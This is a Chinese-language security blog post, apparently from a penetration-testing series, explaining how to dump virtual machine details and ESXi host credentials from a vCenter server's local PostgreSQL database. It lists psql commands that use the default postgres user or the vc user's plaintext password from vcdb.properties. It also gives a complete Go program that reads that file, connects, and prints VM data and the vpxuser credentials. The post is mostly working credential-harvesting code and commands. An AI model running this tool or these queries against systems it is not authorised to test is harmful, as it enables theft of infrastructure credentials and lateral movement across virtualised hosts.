---
layout: post
title: vSphere开发指南4——PostgreSQL
---


## 0x00 前言
---

在之前的三篇文章[《vSphere开发指南1——vSphere Automation API》](https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%971-vSphere-Automation-API)、[《vSphere开发指南2——vSphere Web Services API》](https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%972-vSphere-Web-Services-API)和[《vSphere开发指南3——VMware PowerCLI》](https://3gstudent.github.io/vSphere%E5%BC%80%E5%8F%91%E6%8C%87%E5%8D%973-VMware-PowerCLI)介绍了同虚拟机交互的方法，能够远程导出虚拟机的配置信息，本文将要介绍在vCenter上通过PostgreSQL数据库导出虚拟机配置信息的方法。

## 0x01 简介
---

本文将要介绍以下内容：

- 导出方法
- 程序实现

## 0x02 导出方法
---

vCenter默认安装了PostgreSQL数据库，用来存储VM和ESXI的信息

在之前的文章《Confluence利用指南》提到过：

PostgreSQL安装完成后会在本地操作系统创建一个名为postgres的用户，默认没有口令

如果没有设置用户postgres的口令，可以通过以下命令连接PostgreSQL数据库：

```
psql -h localhost -U postgres
```

执行结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-1/1-1.png)

默认用户列表如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-1/1-2.png)

如果设置了用户postgres的口令并且无法获得，可以选择用户vc进行操作，连接PostgreSQL数据库的命令如下：

```
psql -h localhost -d VCDB -U vc
```

执行结果如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-1/1-3.png)

用户vc的明文口令存储在固定文件`/etc/vmware-vpx/vcdb.properties`中

**注：**

psql不支持直接传入口令作为参数，需要交互的环境进行操作

连接至PostgreSQL数据库后，查询虚拟机配置信息的命令如下：

```
SELECT * FROM vc.vpx_vm;
```

连接至PostgreSQL数据库后，查询ESXI配置信息的命令如下：

```
SELECT * FROM vc.vpx_host;
```

为了便于使用，连接PostgreSQL数据库和查询命令可以进行合并，这里分享以下两个命令示例：

#### (1)使用用户postgres查询虚拟机配置信息

```
psql -h localhost -U postgres -c "SELECT file_name,guest_os,ip_address FROM vc.vpx_vm;" -d VCDB
```

#### (2)使用用户vc查询ESXI配置信息

```
psql -h localhost -U vc -c "SELECT name,username,password,password_last_upd_dt FROM vc.vpxv_hosts;" -d VCDB -W
```

**注：**

psql不支持直接传入口令作为参数，如果用户设置了口令，需要交互的环境下再次输入连接口令

## 0x03 程序实现
---

由于psql不支持直接传入口令作为参数，这里可以考虑编写程序实现数据库连接和查询配置

综合考虑适用性和方便性，这里开发语言选择Golang

支持PostgreSQL的第三方包选择https://github.com/bmizerany/pq

### 1、安装第三方包

命令如下：

```
go get github.com/lib/pq
```

### 2.编写代码

通过`go get github.com/lib/pq`安装的第三方包在vCenter下使用会存在bug，连接数据库时提示`setting PGSERVICEFILE not supported`

这是因为vCenter环境下默认设置了环境变量`$PGSERVICEFILE`，而通过`go get github.com/lib/pq`安装的第三方包默认引用了这个变量，这就导致了错误

错误代码的位置：`%GOPATH%\src\github.com\lib\pq\conn.go`，`Line1988-1989`，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-1/2-1.png)

而github上的代码已经修复了这个bug，代码地址：https://github.com/bmizerany/pq/blob/master/conn.go#L644

如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-1/2-2.png)

所以这里我们只需要注释掉`%GOPATH%\src\github.com\lib\pq\conn.go`的第1988和第1989行代码即可，如下图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2021-10-1/2-3.png)

在代码实现上，首先读取文件`/etc/vmware-vpx/vcdb.properties`获得用户vc的明文口令，使用用户vc连接PostgreSQL数据库，最后导出虚拟机配置信息

完整实现代码如下：

```
package main

import (
	"database/sql"
	"fmt"
	"strings"
	"io/ioutil"
	_ "github.com/lib/pq"
)


func connectDB() *sql.DB{
	fmt.Println("[+] Get the config")
	b, err := ioutil.ReadFile("/etc/vmware-vpx/vcdb.properties")
    if err != nil {
        fmt.Print(err)
    }

	str := string(b)
	fmt.Println(str)
	index1 := strings.Index(str,"password")
	index2 := strings.Index(str,"password.encrypted")
	password := b[index1+11:index2]

	var host     = "localhost"
	var port int = 5432
	var user     = "vc"
	var dbname   = "VCDB"

	psqlInfo := fmt.Sprintf("host=%s port=%d user=%s "+
		"password=%s dbname=%s sslmode=disable",
		host, port, user, password, dbname)

	fmt.Println("[*] psqlInfo:" + psqlInfo)
	db, err := sql.Open("postgres", psqlInfo)
	if err != nil {
		panic(err)
	}

	err = db.Ping()
	if err != nil {
		panic(err)
	}
	fmt.Println("[+] Successfully connected!")
	return db
}


func queryVM(db *sql.DB){
	var file_name,guest_os,ip_address,power_state string

	fmt.Println("[*] Querying VM")
	rows,err:=db.Query("SELECT file_name,guest_os,ip_address,power_state FROM vc.vpx_vm")

	if err!= nil{
		panic(err)
	}
	defer rows.Close()
	for rows.Next(){
		err:= rows.Scan(&file_name,&guest_os,&ip_address,&power_state)
		if err!= nil{
			//fmt.Println(err)
		}
		fmt.Println(" - file_name   : " + file_name)
		fmt.Println("   guest_os    : " + guest_os)
		fmt.Println("   ip_address  : " + ip_address)
		fmt.Println("   power_state : " + power_state)
	}
	err = rows.Err()
	if err!= nil{
		panic(err)
	}
}


func queryESXI(db *sql.DB){
	var name,username,password,password_last_upd_dt string

	fmt.Println("[*] Querying ESXI")
	rows,err:=db.Query("SELECT name,username,password,password_last_upd_dt FROM vc.vpxv_hosts")

	if err!= nil{
		panic(err)
	}
	defer rows.Close()
	for rows.Next(){
		err:= rows.Scan(&name,&username,&password,&password_last_upd_dt)
		if err!= nil{
			//fmt.Println(err)
		}
		fmt.Println(" - name         : " + name)
		fmt.Println("   username     : " + username)
		fmt.Println("   password     : " + password)
		fmt.Println("   password_last: " + password_last_upd_dt)

	}
	err = rows.Err()
	if err!= nil{
		panic(err)
	}
}


func main()  {
	db:=connectDB()
	queryVM(db)
	queryESXI(db)
}
```

### 3.跨平台编译

将以上代码保存为main.go

编译成Linux版本的命令如下：

```
SET CGO_ENABLED=0
SET GOOS=linux
SET GOARCH=amd64
go build -o vCenter_Query_PostgreSQL
```


### 4.测试

在vCenter上执行vCenter_Query_PostgreSQL，能够自动导出虚拟机和ESXI的配置信息

### 补充：

执行命令`SELECT name,username,password,password_last_upd_dt FROM vc.vpxv_hosts;`能够导出vpxuser用户的加密口令

当ESXI主机连接vCenter时，ESXI主机会创建一个root权限的用户vpxuser

默认情况下，vCenter Server使用OpenSSL密码库作为随机来源，每30天生成一个新的vpxuser密码，密码长度为32个字符

## 0x04 小结
---

本文介绍了在vCenter上通过PostgreSQL数据库导出虚拟机配置信息的方法，在渗透测试中，是极其重要的一环。

---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)









